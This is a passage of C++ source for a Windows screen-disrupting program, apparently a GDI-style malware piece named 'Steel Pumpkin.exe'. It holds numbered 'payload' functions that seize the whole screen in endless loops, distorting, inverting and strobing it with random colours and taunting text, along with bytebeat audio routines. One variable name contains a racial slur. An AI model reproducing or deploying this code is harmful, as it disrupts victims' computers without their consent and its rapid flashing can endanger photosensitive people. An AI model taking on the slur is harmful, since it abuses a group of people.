	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), xxx = 0, xxx2 = 0, mode = 1, fx = 0, fy = 0;
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
	PRGBQUAD rgbScreen = { 0 };
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	while (true) {
		hdc = GetDC(0);
		if (xxx2 == 48) {
			if (mode == 2) { mode = 1; }
			else { mode = 2; }
			xxx2 = 0;
		}
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			if (mode == 1) { fx = ((xxx + x) ^ (y - xxx)) & x, fy = ((xxx - x) ^ (xxx + y)) & y; }
			else { fx = ((xxx + x) ^ (xxx >> y)) & x, fy = ((x ^ xxx) ^ (xxx - y)) & y; }
			rgbScreen[i].rgb = xxx - (((xxx + x) ^ (xxx + y)) | RGB(fx, fy, fx) ^ (fy - fx));
		}
		for (int y = 0; y < h; y++) { StretchBlt(hdcCopy, -5 + rand() % 11, y, w, 1, hdcCopy, 0, y, w, 1, SRCCOPY); }
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
		ReleaseDC(0, hdc);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
		xxx++;
		xxx2 += 2;
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload10_num2(LPVOID lparam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdc, bmp);
	LPCSTR texts[11] = {
		"Steel Pumpkin.exe",
		"Seed.1097",
		"LambdaTechnology Studio",
		"LanPiaoPiaoFlyNB",
		"impossible to escape this cage",
		"waiting to be crushed by iron",
		"no choice......",
		"1000000000000000000 tons",
		"hopelessness",
		"no freedom here.",
		"the body is being petrified"
	};
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int rnd = rand() % 11;
		HFONT hFont = CreateFontA(rand() % 91, 0, rand() % 78, 0, FW_BOLD, true, true, true, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, "Frekoda");
		SelectObject(hdc, hFont);
		SetBkColor(hdc, RndRGB);
		SetTextColor(hdc, RndRGB);
		TextOutA(hdc, rand() % w, rand() % h, texts[rnd], strlen(texts[rnd]));
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteObject(hFont);
		Sleep(25);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload11_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * w + x;
				int fx = (int)((i * 4) + (i ^ 4) - cbrt(RGB(x & y, x ^ y, x | y)) * sin((sqrt(x + (10 * i)) * y)));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
				hslcolor.s = 1.5033f;
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
	}
	SelectObject(hdcCopy, bmpcopy);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload11_num2(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		hdc = GetDC(0);
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, hbrush);
		StretchBlt(hdc, 0, 0, (w / 2) + 20, (h / 2) + 20, hdc, 0, 0, w, h, SRCCOPY);
		BitBlt(hdc, 0, (h / 2) - 20, w / 2, h / 2, hdc, 10, h / 2, SRCBRUSH);
		StretchBlt(hdc, (w / 2) + 10, 10, (w / 2) - 20, (h / 2) - 20, hdc, w / 2, 0, w / 2, h / 2, RGBBRUSH);
		BitBlt(hdc, w / 2 + 20, h / 2 + 4, w / 2, h / 2, hdc, w / 2, h / 2, SRCINVERT);
		Sleep(100);
		ReleaseDC(0, hdc);
		DeleteObject(hbrush);
	}
	return 0;
}
DWORD WINAPI Payload12_num1(LPVOID lparam) {//stolen from mazelarper's shitty malware, modified by me
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), centerX = w / 2, centerY = h / 2;
	BITMAPINFO bmi = {};
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;
	void* pixels = nullptr;
	HBITMAP bmp = CreateDIBSection(hdcCopy, &bmi, DIB_RGB_COLORS, &pixels, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	RGBQUAD* buffer = (RGBQUAD*)pixels;
	double xxx = 0.f;
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; ++y)
		{
			for (int x = 0; x < w; ++x)
			{
				double dx = (x - centerX) / 4000.f, dy = (y - centerY) / 4000.f, wave = round(logb((dx / (dx + dy) * dy) * 4000 - xxx));
				int r = (int)(1.5f * (1 + (tan(wave + xxx)))), g = (int)(1.5f * (1 + (tan(wave + xxx / 2)))), b = (int)(1.5f * (1 + (tan(wave + xxx / 4))));
				buffer[y * w + x] = { (BYTE)b, (BYTE)g, (BYTE)r, 0 };
			}
		}
		xxx += 0.07f;
		BLENDFUNCTION blend = { 0, 0, 100, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload13_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	double angle = 0;
	while (true)
	{
		hdc = GetDC(0);
		for (float i = w; i > 0; i -= 0.99f) {
			int a = round(asin(cosf(angle))) * 114;
			BitBlt(hdc, i, 0, 1, h, hdc, i, a, SRCCOPY);
			angle += PI / 51.4;
		}
		ReleaseDC(0, hdc);
		Sleep(1);
	}
	return 0;
}
DWORD WINAPI Payload13_num2(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), x, y;
	while (true) {
		hdc = GetDC(0);
		x = rand() % w, y = rand() % h;
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, hbrush);
		BitBlt(hdc, x, 1, 10, h, hdc, x, 0, SRCBRUSH);
		BitBlt(hdc, 1, y, w, 10, hdc, 0, y, SRCBRUSH);
		ReleaseDC(0, hdc);
		DeleteObject(hbrush);
		Sleep(2);
	}
	return 0;
}
DWORD WINAPI Payload14_num1(LPVOID lparam) {//polygon by AWJDXUGE&mazelarper
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	float ri = 2.0893, ricopy = 5.0893, ro = 3.8946, rocopy = 2.8946, ax = 0.5, ay = 2.0286, bx = 1.8099, bxcopy = 2.8099, by = 3.4485, cx = 1.3855, cy = 1.5639, dx = 3.2052, dy = 2.2124, ex = 1.9535, ey = 0.7409, fx = 3.8662, fy = 0.4694, gx = 2.0741, gy = 0.2518, hx = 3.6415, hy = 1.381, ix = 1.7195, iy = 1.1869, jx = 2.5826, jxcopy = 7.5826, jy = 2.9152, kx = 0.9709, ky = 1.85, lx = 0.932, ly = 3.7814;
	while (true)
	{
		hdc = GetDC(0);
		int x = rand() % w, y = rand() % h, z = 1 + rand() % 128;
		POINT point[26] = { x,y + (ro * z),x - (ax * z),y + (ay * z),x - (bx * z),y + (by * z),x - (cx * z),y + (cy * z),x - (dx * z),y + (dy * z),x - (ex * z),y + (ey * z),x - (fx * z),y + (fy * z),x - (gx * z),y - (gy * z),x - (hx * z),y - (hy * z),x - (ix * z),y - (iy * z),x - (jx * z),y - (jy * z),x - (kx * z),y - (ky * z),x - (lx * z),y - (ly * z),x,y - (ri * z),x + (lx * z),y - (ly * z),x + (kx * z),y - (ky * z),x + (jx * z),y - (jy * z),x + (ix * z),y - (iy * z),x + (hx * z),y - (hy * z),x + (gx * z),y - (gy * z),x + (fx * z),y + (fy * z),x + (ex * z),y + (ey * z) ,x + (dx * z),y + (dy * z),x + (cx * z),y + (cy * z),x + (bx * z),y + (by * z),x + (ax * z),y + (ay * z) }, pointcopy[26] = { x,y + (rocopy * z),x + (ax * z),y + (ay * z),x + (bxcopy * z),y + (by * z),x + (cx * z),y + (cy * z),x + (dx * z),y + (dy * z),x - (ex * z),y + (ey * z),x + (fx * z),y + (fy * z),x - (gx * z),y + (gy * z),x - (hx * z),y - (hy * z),x - (ix * z),y - (iy * z),x - (jx * z),y - (jy * z),x - (kx * z),y - (ky * z),x - (lx * z),y - (ly * z),x,y - (ricopy * z),x + (lx * z),y - (ly * z),x + (kx * z),y - (ky * z),x + (jxcopy * z),y - (jy * z),x + (ix * z),y - (iy * z),x + (hx * z),y - (hy * z),x + (gx * z),y - (gy * z),x + (fx * z),y + (fy * z),x + (ex * z),y + (ey * z) ,x + (dx * z),y + (dy * z),x + (cx * z),y + (cy * z),x + (bxcopy * z),y + (by * z),x + (ax * z),y + (ay * z) };
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, hbrush);
		HRGN pg = CreatePolygonRgn(point, 26, WINDING), pgcopy = CreatePolygonRgn(pointcopy, 26, WINDING);
		InvertRgn(hdc, pg);
		InvertRgn(hdc, pgcopy);
		DeleteObject(hbrush);
		DeleteObject(pg);
		DeleteObject(pgcopy);
		ReleaseDC(NULL, hdc);
		Sleep(8);
	}
	return 0;
}
DWORD WINAPI Payload15_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	LPCWSTR stopskiddingnigga[] = { L"          ", L"        ", L"                      ", L"  ", L"      " };
	while (true)
	{
		hdc = GetDC(0);
		int radius = 100, rx = rand() % w, ry = rand() % h;
		SetTextColor(hdc, RndRGB);
		SetBkColor(hdc, RndRGB);
		int rnd = rand() % 5;
		for (int t = 5; t < w + h; t++, t += 10) {
			int x = (int)(float)(radius + t / log(t + radius * 10)) + rx,
				y = (int)(float)(radius + t / sin(t + radius * 10)) + ry;
			TextOutW(hdc, x, y, stopskiddingnigga[rnd], wcslen(stopskiddingnigga[rnd]));
		}
		Sleep(10);
		ReleaseDC(0, hdc);
	}
	return 0;
}
DWORD WINAPI Payload16_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL);
	int wdpi = GetDeviceCaps(hdc, LOGPIXELSX), hdpi = GetDeviceCaps(hdc, LOGPIXELSY), w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		hdc = GetDC(0);
		for (int x = 0; x <= w; x += 64 * wdpi / 96) {
			for (int y = 0; y <= h; y += 64 * hdpi / 96) {
				DrawIconEx(hdc, x, y, LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(107)), 64 * wdpi / 96, 64 * hdpi / 96, 0, 0, DI_NORMAL);
				Sleep(50);
			}
		}
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI Payload17_num1(LPVOID lparam) {//credits to N17Pro3426
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), mazelarper_s_dick_num = 0;
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdcCopy, 0, 0, w, h, hdcCopy, mazelarper_s_dick_num - w, 0, SRCCOPY);
		BitBlt(hdcCopy, -mazelarper_s_dick_num, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		BitBlt(hdcCopy, 0, 0, w, h, hdcCopy, 0, mazelarper_s_dick_num - h, SRCCOPY);
		BitBlt(hdcCopy, 0, -mazelarper_s_dick_num, w, h, hdcCopy, 0, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		mazelarper_s_dick_num = mazelarper_s_dick_num + 1;
		if (h <= mazelarper_s_dick_num) { mazelarper_s_dick_num = 0; }
		ReleaseDC(0, hdc);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload18_num1(LPVOID lparam) {
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), n = 0, n1 = -1, n2 = -1;
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		if (n == 0) {
			int tmp = n1;
			for (int x = 0; x <= w; x += (w / 5)) {
				BitBlt(hdcCopy, x, tmp * 20, w / 5, h, hdcCopy, x, 0, SRCCOPY);
				HBRUSH hbrush = CreateSolidBrush(RndRGB);
				SelectObject(hdcCopy, hbrush);
				PatBlt(hdcCopy, x, 0, w / 5, h, PATINVERT);
				DeleteObject(hbrush);
				tmp = -tmp;
			}
			n1 = -n1, n = 1;
		}
		else {
			int tmp = n2;
			for (int y = 0; y <= h; y += (h / 5)) {
				BitBlt(hdcCopy, tmp * 20, y, w, h / 5, hdcCopy, 0, y, SRCCOPY);
				HBRUSH hbrush = CreateSolidBrush(RndRGB);
				SelectObject(hdcCopy, hbrush);
				PatBlt(hdcCopy, 0, y, w, h / 5, PATINVERT);
				DeleteObject(hbrush);
				tmp = -tmp;
			}
			n2 = -n2, n = 0;
		}
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		Sleep(50);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
VOID WINAPI bytebeat1() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * t / 13 ^ t * (t >> 13) & t | 13));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat2() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t >> t / 13 ^ t - (t >> 13) & t | 13));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat3() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * t / 13 & t * (t >> 13) & t | 13));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat4() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * (t / 13 & t) + (t >> 13) & t | 13));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat5() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * (t / 13 & t) + (t >> 13) ^ t & 13));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat6() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * sqrt(t / 13 & t) + ((t >> 13) ^ t & 13)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat7() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(129 * tan((t * t >> 13 | t * (t >> 13) | t >> 13) / 20) + 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat8() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan(t * (t >> 6 & t >> 13) * 26 & 169) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat9() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t * (t >> 6 & t >> 13) ^ 26) + (t & 169)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat10() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t * (t >> 6 & t + 13) ^ 26) + (t & 169)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat11() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t * (t >> 6 & t + 13) / 26) + (t | 169)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
